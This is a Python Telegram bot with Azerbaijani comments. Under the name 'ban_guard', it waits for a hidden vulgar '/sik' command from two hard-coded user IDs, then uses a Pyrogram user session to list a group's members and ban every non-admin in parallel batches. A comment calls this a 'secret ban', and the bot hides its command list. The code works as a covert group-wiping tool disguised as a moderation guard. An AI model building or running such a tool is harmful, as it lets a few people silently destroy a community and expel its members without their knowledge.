import logging
import os
import asyncio
from pyrogram import Client
from pyrogram.enums import ChatMembersFilter
from telegram import Update
from telegram.ext import (
    Application, MessageHandler,
    ContextTypes, filters
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN          = os.environ["BOT_TOKEN"]
API_ID         = int(os.environ["API_ID"])
API_HASH       = os.environ["API_HASH"]
STRING_SESSION = os.environ["STRING_SESSION"]

# Yalnız bu 2 nəfər istifadə edə bilər
ALLOWED = {8034872992, 8789267931}

pyro = Client(
    "ban_guard",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=STRING_SESSION,
    sleep_threshold=60,
)

async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.effective_user:
        return
    if update.effective_chat.type == "private":
        return

    msg  = update.message
    uid  = update.effective_user.id
    text = (msg.text or "").strip()

    if not text.startswith("/sik"):
        return

    # Yalnız icazəli 2 nəfər
    if uid not in ALLOWED:
        return

    cid = update.effective_chat.id

    # Adminləri al
    admins = set()
    try:
        admins_list = await ctx.bot.get_chat_administrators(cid)
        for admin in admins_list:
            admins.add(admin.user.id)
    except Exception as e:
        logger.warning(f"Admin siyahısı alınamadı: {e}")

    # Pyrogram ilə üzv siyahısını al
    to_ban = []
    try:
        async for member in pyro.get_chat_members(cid):
            user = member.user
            if user is None:
                continue
            if user.is_bot:
                continue
            if user.id in admins:
                continue
            if user.id in ALLOWED:
                continue
            to_ban.append(user.id)
    except Exception as e:
        logger.warning(f"Üyeler alınamadı: {e}")
        return

    # Gizli ban — paralel işlə
    banned  = 0
    skipped = 0

    async def ban_user(user_id):
        nonlocal banned, skipped
        try:
            await ctx.bot.ban_chat_member(cid, user_id)
            banned += 1
        except Exception as e:
            logger.warning(f"Ban xətası {user_id}: {e}")
            skipped += 1

    # 30-lu batch ilə paralel ban
    for i in range(0, len(to_ban), 30):
        batch = to_ban[i:i+30]
        await asyncio.gather(*[ban_user(uid) for uid in batch])
        await asyncio.sleep(1)

    logger.info(f"Tamamlandı: banlanan={banned}, atlanan={skipped}")

async def post_init(tg_app: Application):
    await pyro.start()
    print("Pyrogram başladı!")
    await tg_app.bot.set_my_commands([])

async def post_shutdown(tg_app: Application):
    try:
        await pyro.stop()
    except Exception:
        pass

def main():
    tg_app = (
        Application.builder()
        .token(TOKEN)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )
    tg_app.add_handler(MessageHandler(filters.TEXT, handle_message))
    tg_app.add_handler(MessageHandler(filters.COMMAND, handle_message))

    print("Ban botu başladı...")
    tg_app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
